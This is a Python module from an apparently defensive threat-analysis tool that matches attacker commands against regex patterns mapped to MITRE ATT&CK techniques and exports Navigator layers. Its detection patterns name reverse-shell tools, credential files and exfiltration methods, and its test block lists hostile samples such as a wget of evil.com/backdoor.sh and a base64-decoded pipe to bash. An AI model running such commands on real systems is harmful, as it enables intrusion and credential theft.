"""
DARPAN MITRE ATT&CK Mapper
Maps observed attacker commands to ATT&CK techniques and generates
Navigator layer files for visualization.
"""
import json
import logging
import re
from collections import defaultdict
from datetime import datetime
from pathlib import Path
from typing import Any

log = logging.getLogger("darpan.mitre_mapper")

NAVIGATOR_DIR = Path("/opt/darpan/intel/navigator")

# Full command-to-TTP mapping — 50+ entries
TTP_DATABASE: list[dict[str, Any]] = [
    # ── Reconnaissance ───────────────────────────────────────────────────────
    {"pattern": r"\bnmap\b",          "tactic": "Reconnaissance",        "technique_id": "T1046",    "technique_name": "Network Service Discovery",              "sub_technique": None,     "confidence": "HIGH"},
    {"pattern": r"\bmasscan\b",       "tactic": "Reconnaissance",        "technique_id": "T1046",    "technique_name": "Network Service Discovery",              "sub_technique": None,     "confidence": "HIGH"},
    {"pattern": r"\bzmap\b",          "tactic": "Reconnaissance",        "technique_id": "T1046",    "technique_name": "Network Service Discovery",              "sub_technique": None,     "confidence": "HIGH"},
    {"pattern": r"\bshodan\b",        "tactic": "Reconnaissance",        "technique_id": "T1595",    "technique_name": "Active Scanning",                        "sub_technique": None,     "confidence": "MEDIUM"},

    # ── Initial Access ────────────────────────────────────────────────────────
    {"pattern": r"\bssh\b.*-p\s+\d+|\bbrute\b",  "tactic": "Initial Access",  "technique_id": "T1110",    "technique_name": "Brute Force",                   "sub_technique": "T1110.001", "confidence": "HIGH"},
    {"pattern": r"\bhydra\b|\bmedusa\b|\bpatator\b", "tactic": "Initial Access", "technique_id": "T1110",   "technique_name": "Brute Force",                   "sub_technique": "T1110.001", "confidence": "HIGH"},

    # ── Execution ────────────────────────────────────────────────────────────
    {"pattern": r"\bpython3?\s+-c\b",       "tactic": "Execution",       "technique_id": "T1059.006", "technique_name": "Python Script Execution",              "sub_technique": "T1059.006", "confidence": "HIGH"},
    {"pattern": r"\bperl\s+-e\b",           "tactic": "Execution",       "technique_id": "T1059.006", "technique_name": "Perl Script Execution",                "sub_technique": "T1059.006", "confidence": "HIGH"},
    {"pattern": r"\bbash\s+-c\b|\bsh\s+-c\b","tactic": "Execution",      "technique_id": "T1059.004", "technique_name": "Unix Shell",                           "sub_technique": "T1059.004", "confidence": "HIGH"},
    {"pattern": r"\bphp\s+-r\b",            "tactic": "Execution",       "technique_id": "T1059.006", "technique_name": "PHP Script Execution",                 "sub_technique": None,        "confidence": "HIGH"},
    {"pattern": r"\bchmod\s+\+x\b",         "tactic": "Execution",       "technique_id": "T1222",     "technique_name": "File/Directory Permissions Modification","sub_technique": None,        "confidence": "MEDIUM"},
    {"pattern": r"\./[a-zA-Z0-9_-]+",       "tactic": "Execution",       "technique_id": "T1204",     "technique_name": "User Execution",                       "sub_technique": None,        "confidence": "MEDIUM"},

    # ── Persistence ───────────────────────────────────────────────────────────
    {"pattern": r"\bcrontab\b",             "tactic": "Persistence",     "technique_id": "T1053.003", "technique_name": "Cron",                                 "sub_technique": "T1053.003", "confidence": "HIGH"},
    {"pattern": r"\bat\s+\d",               "tactic": "Persistence",     "technique_id": "T1053.001", "technique_name": "At Job",                               "sub_technique": "T1053.001", "confidence": "HIGH"},
    {"pattern": r"\bsystemctl\s+enable\b",  "tactic": "Persistence",     "technique_id": "T1543.002", "technique_name": "Systemd Service",                      "sub_technique": "T1543.002", "confidence": "HIGH"},
    {"pattern": r"\.bashrc|\.bash_profile|\.profile", "tactic": "Persistence", "technique_id": "T1546.004", "technique_name": "Unix Shell Configuration Modification","sub_technique": "T1546.004", "confidence": "HIGH"},
    {"pattern": r"authorized_keys",         "tactic": "Persistence",     "technique_id": "T1098.004", "technique_name": "SSH Authorized Keys",                  "sub_technique": "T1098.004", "confidence": "HIGH"},
    {"pattern": r"\buseradd\b|\badduser\b", "tactic": "Persistence",     "technique_id": "T1136.001", "technique_name": "Create Local Account",                 "sub_technique": "T1136.001", "confidence": "HIGH"},

    # ── Privilege Escalation ──────────────────────────────────────────────────
    {"pattern": r"\bsudo\b",                "tactic": "Privilege Escalation", "technique_id": "T1548.003", "technique_name": "Sudo Abuse",                     "sub_technique": "T1548.003", "confidence": "MEDIUM"},
    {"pattern": r"\bsu\s+-\b|\bsu\s+root\b","tactic": "Privilege Escalation", "technique_id": "T1548",    "technique_name": "Abuse Elevation Control",         "sub_technique": None,        "confidence": "MEDIUM"},
    {"pattern": r"find.*-perm.*-4000",       "tactic": "Privilege Escalation", "technique_id": "T1548.001","technique_name": "Setuid/Setgid Bits",             "sub_technique": "T1548.001", "confidence": "HIGH"},
    {"pattern": r"\bpasswd\b",              "tactic": "Privilege Escalation", "technique_id": "T1548",    "technique_name": "Password Change",                 "sub_technique": None,        "confidence": "LOW"},

    # ── Defense Evasion ────────────────────────────────────────────────────────
    {"pattern": r"history\s+-c|HISTFILESIZE=0|unset\s+HISTFILE", "tactic": "Defense Evasion", "technique_id": "T1070.003", "technique_name": "Clear Command History", "sub_technique": "T1070.003", "confidence": "HIGH"},
    {"pattern": r"echo\s+['\"]?\s*>\s*/var/log",    "tactic": "Defense Evasion", "technique_id": "T1070.002", "technique_name": "Clear Linux/Mac System Logs",   "sub_technique": "T1070.002", "confidence": "HIGH"},
    {"pattern": r"\bshred\b|\bsrm\b",               "tactic": "Defense Evasion", "technique_id": "T1070.004", "technique_name": "File Deletion",                "sub_technique": "T1070.004", "confidence": "HIGH"},
    {"pattern": r"\bbase64\b",                       "tactic": "Defense Evasion", "technique_id": "T1140",     "technique_name": "Deobfuscate/Decode Files",      "sub_technique": None,        "confidence": "MEDIUM"},
    {"pattern": r"eval\s*\(",                        "tactic": "Defense Evasion", "technique_id": "T1027",     "technique_name": "Obfuscated Files or Information","sub_technique": None,        "confidence": "HIGH"},
    {"pattern": r"\bchattr\b",                       "tactic": "Defense Evasion", "technique_id": "T1222",     "technique_name": "File Permissions Modification", "sub_technique": None,        "confidence": "MEDIUM"},
    {"pattern": r"\bupdate-alternatives\b|\bld\.so\b", "tactic": "Defense Evasion","technique_id": "T1574",   "technique_name": "Hijack Execution Flow",          "sub_technique": None,        "confidence": "MEDIUM"},

    # ── Credential Access ──────────────────────────────────────────────────────
    {"pattern": r"/etc/passwd",              "tactic": "Credential Access","technique_id": "T1003.008", "technique_name": "OS Credential Dumping: /etc/passwd",  "sub_technique": "T1003.008", "confidence": "HIGH"},
    {"pattern": r"/etc/shadow",              "tactic": "Credential Access","technique_id": "T1003.008", "technique_name": "OS Credential Dumping: /etc/shadow",  "sub_technique": "T1003.008", "confidence": "HIGH"},
    {"pattern": r"\bmimikatz\b",             "tactic": "Credential Access","technique_id": "T1003.001", "technique_name": "LSASS Memory",                        "sub_technique": "T1003.001", "confidence": "HIGH"},
    {"pattern": r"\.ssh/id_rsa|\.ssh/id_ed25519", "tactic": "Credential Access","technique_id": "T1552.004","technique_name": "Private Keys",                   "sub_technique": "T1552.004", "confidence": "HIGH"},
    {"pattern": r"\bkeylogger\b",            "tactic": "Credential Access","technique_id": "T1056.001", "technique_name": "Keylogging",                          "sub_technique": "T1056.001", "confidence": "HIGH"},
    {"pattern": r"\bhashcat\b|\bjohn\b",     "tactic": "Credential Access","technique_id": "T1110.002", "technique_name": "Password Cracking",                   "sub_technique": "T1110.002", "confidence": "HIGH"},

    # ── Discovery ─────────────────────────────────────────────────────────────
    {"pattern": r"\buname\b|\bhostname\b|\blscpu\b","tactic": "Discovery","technique_id": "T1082",     "technique_name": "System Information Discovery",          "sub_technique": None,        "confidence": "MEDIUM"},
    {"pattern": r"\bwhoami\b|\bid\b",        "tactic": "Discovery",       "technique_id": "T1033",     "technique_name": "System Owner/User Discovery",           "sub_technique": None,        "confidence": "HIGH"},
    {"pattern": r"\bps\s+aux\b|\btop\b|\bhtop\b", "tactic": "Discovery", "technique_id": "T1057",     "technique_name": "Process Discovery",                    "sub_technique": None,        "confidence": "MEDIUM"},
    {"pattern": r"\bls\s+/home\b|\bcat\s+/etc/passwd\b", "tactic": "Discovery","technique_id": "T1087.001","technique_name": "Account Discovery: Local",         "sub_technique": "T1087.001", "confidence": "HIGH"},
    {"pattern": r"\bnetstat\b|\bss\s+-t\b|\bss\s+-a\b", "tactic": "Discovery","technique_id": "T1049", "technique_name": "System Network Connections Discovery", "sub_technique": None,        "confidence": "MEDIUM"},
    {"pattern": r"\bip\s+addr\b|\bifconfig\b","tactic": "Discovery",      "technique_id": "T1016",     "technique_name": "System Network Configuration Discovery","sub_technique": None,        "confidence": "MEDIUM"},
    {"pattern": r"\bdf\b|\bdu\b|\bmount\b",  "tactic": "Discovery",       "technique_id": "T1083",     "technique_name": "File and Directory Discovery",          "sub_technique": None,        "confidence": "LOW"},
    {"pattern": r"\bfind\s+/\b",             "tactic": "Discovery",       "technique_id": "T1083",     "technique_name": "File and Directory Discovery",          "sub_technique": None,        "confidence": "MEDIUM"},
    {"pattern": r"\bcrontab\s+-l\b",         "tactic": "Discovery",       "technique_id": "T1053.003", "technique_name": "Scheduled Task Discovery",             "sub_technique": None,        "confidence": "MEDIUM"},

    # ── Lateral Movement ──────────────────────────────────────────────────────
    {"pattern": r"\bssh\b\s+\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}", "tactic": "Lateral Movement","technique_id": "T1021.004","technique_name": "SSH Lateral Movement","sub_technique": "T1021.004","confidence": "HIGH"},
    {"pattern": r"\bscp\b",                  "tactic": "Lateral Movement","technique_id": "T1021.004", "technique_name": "Remote File Transfer via SSH",          "sub_technique": "T1021.004", "confidence": "MEDIUM"},
    {"pattern": r"\bnc\b.*-e\b|\bnetcat\b.*-e\b","tactic": "Lateral Movement","technique_id": "T1059",  "technique_name": "Netcat Bind/Reverse Shell",             "sub_technique": None,        "confidence": "HIGH"},
    {"pattern": r"\bsocat\b",                "tactic": "Lateral Movement","technique_id": "T1059",     "technique_name": "Socat Relay",                           "sub_technique": None,        "confidence": "HIGH"},

    # ── Collection ────────────────────────────────────────────────────────────
    {"pattern": r"\bmysqldump\b",            "tactic": "Collection",      "technique_id": "T1005",     "technique_name": "Data from Local System: DB Dump",       "sub_technique": None,        "confidence": "HIGH"},
    {"pattern": r"\bpg_dump\b",              "tactic": "Collection",      "technique_id": "T1005",     "technique_name": "Data from Local System: PG Dump",        "sub_technique": None,        "confidence": "HIGH"},
    {"pattern": r"\btar\s+-c\b|\bzip\b",     "tactic": "Collection",      "technique_id": "T1560.001", "technique_name": "Archive via Utility",                   "sub_technique": "T1560.001", "confidence": "MEDIUM"},
    {"pattern": r"\brsync\b",                "tactic": "Collection",      "technique_id": "T1005",     "technique_name": "Data from Local System",                 "sub_technique": None,        "confidence": "MEDIUM"},

    # ── C2 (Command and Control) ───────────────────────────────────────────────
    {"pattern": r"\bwget\b|\bcurl\b",        "tactic": "Command and Control","technique_id": "T1105",  "technique_name": "Ingress Tool Transfer",                 "sub_technique": None,        "confidence": "HIGH"},
    {"pattern": r"python.*socket.*connect|bash.*dev.*tcp", "tactic": "Command and Control","technique_id": "T1095","technique_name": "Non-Application Layer Protocol","sub_technique": None,"confidence": "HIGH"},

    # ── Exfiltration ──────────────────────────────────────────────────────────
    {"pattern": r"\bcurl\b.*-T\b|\bwget\b.*--post-file", "tactic": "Exfiltration","technique_id": "T1048","technique_name": "Exfiltration Over Alternative Protocol","sub_technique": None,"confidence": "MEDIUM"},
    {"pattern": r"\bdns\b.*exfil|xxd.*\|.*nslookup", "tactic": "Exfiltration","technique_id": "T1048.003","technique_name": "Exfiltration Over DNS","sub_technique": "T1048.003","confidence": "MEDIUM"},
]


class MITREMapper:
    def __init__(self):
        self._compiled = [
            {**entry, "_pattern": re.compile(entry["pattern"], re.IGNORECASE)}
            for entry in TTP_DATABASE
        ]

    def map_session(self, commands: list[str]) -> list[dict[str, Any]]:
        all_text = "\n".join(commands)
        seen_ids: set[str] = set()
        results: list[dict] = []

        for entry in self._compiled:
            m = entry["_pattern"].search(all_text)
            if m and entry["technique_id"] not in seen_ids:
                seen_ids.add(entry["technique_id"])
                evidence_cmd = self._find_evidence(
                    commands, entry["_pattern"]
                )
                results.append({
                    "tactic":          entry["tactic"],
                    "technique_id":    entry["technique_id"],
                    "technique_name":  entry["technique_name"],
                    "sub_technique":   entry.get("sub_technique"),
                    "confidence":      entry["confidence"],
                    "evidence_command": evidence_cmd,
                })

        return sorted(results, key=lambda x: (x["tactic"], x["technique_id"]))

    def _find_evidence(self, commands: list[str], pattern: re.Pattern) -> str:
        for cmd in commands:
            if pattern.search(cmd):
                return cmd[:100]
        return ""

    def generate_attack_navigator_layer(
        self,
        ttps: list[dict],
        layer_name: str = "DARPAN Session",
        description: str = "Generated by DARPAN threat analysis",
    ) -> dict:
        confidence_score = {"HIGH": 100, "MEDIUM": 67, "LOW": 33}

        technique_map: dict[str, dict] = {}
        for ttp in ttps:
            tid = ttp.get("technique_id", "")
            if not tid:
                continue
            score = confidence_score.get(ttp.get("confidence", "LOW"), 33)
            if tid not in technique_map or score > technique_map[tid]["score"]:
                technique_map[tid] = {
                    "techniqueID": tid,
                    "score": score,
                    "color": "",
                    "comment": f"{ttp['technique_name']} — {ttp.get('evidence_command','')[:60]}",
                    "enabled": True,
                    "metadata": [
                        {"name": "tactic", "value": ttp.get("tactic", "")},
                        {"name": "confidence", "value": ttp.get("confidence", "")},
                    ],
                    "showSubtechniques": bool(ttp.get("sub_technique")),
                }

        layer = {
            "name": layer_name,
            "versions": {"attack": "14", "navigator": "4.9.1", "layer": "4.5"},
            "domain": "enterprise-attack",
            "description": description,
            "filters": {"platforms": ["Linux", "Network"]},
            "sorting": 0,
            "layout": {"layout": "side", "aggregateFunction": "max", "showID": True, "showName": True, "showAggregateScores": False, "countUnscored": False},
            "hideDisabled": False,
            "techniques": list(technique_map.values()),
            "gradient": {
                "colors": ["#ffffff", "#ff6666"],
                "minValue": 0,
                "maxValue": 100,
            },
            "legendItems": [
                {"label": "High confidence (100)", "color": "#ff6666"},
                {"label": "Medium confidence (67)", "color": "#ffaa66"},
                {"label": "Low confidence (33)", "color": "#ffdd99"},
            ],
            "metadata": [
                {"name": "generated_by", "value": "DARPAN v1.0"},
                {"name": "generated_at", "value": datetime.utcnow().isoformat() + "Z"},
                {"name": "technique_count", "value": str(len(technique_map))},
            ],
        }
        return layer

    def save_navigator_layer(
        self, ttps: list[dict], campaign_id: str
    ) -> Path:
        NAVIGATOR_DIR.mkdir(parents=True, exist_ok=True)
        layer = self.generate_attack_navigator_layer(
            ttps,
            layer_name=f"DARPAN — {campaign_id}",
            description=f"ATT&CK techniques observed in campaign {campaign_id}",
        )
        path = NAVIGATOR_DIR / f"{campaign_id}_navigator.json"
        path.write_text(json.dumps(layer, indent=2), encoding="utf-8")
        log.info(f"ATT&CK Navigator layer saved: {path}")
        return path


if __name__ == "__main__":
    import sys
    logging.basicConfig(level=logging.INFO)
    mapper = MITREMapper()

    test_commands = [
        "whoami", "id", "uname -a", "cat /etc/passwd", "cat /etc/shadow",
        "crontab -e", "wget http://evil.com/backdoor.sh",
        "python3 -c 'import socket; s=socket.socket()'",
        "history -c", "base64 -d payload.txt | bash",
        "ssh root@10.0.1.5", "mysqldump -u root -ppassword --all-databases",
    ]

    print("Mapping commands to MITRE ATT&CK...")
    ttps = mapper.map_session(test_commands)
    for ttp in ttps:
        print(f"  [{ttp['technique_id']}] {ttp['tactic']}: {ttp['technique_name']} ({ttp['confidence']})")

    layer = mapper.save_navigator_layer(ttps, "CAMP-TEST-0001")
    print(f"\nNavigator layer: {layer}")
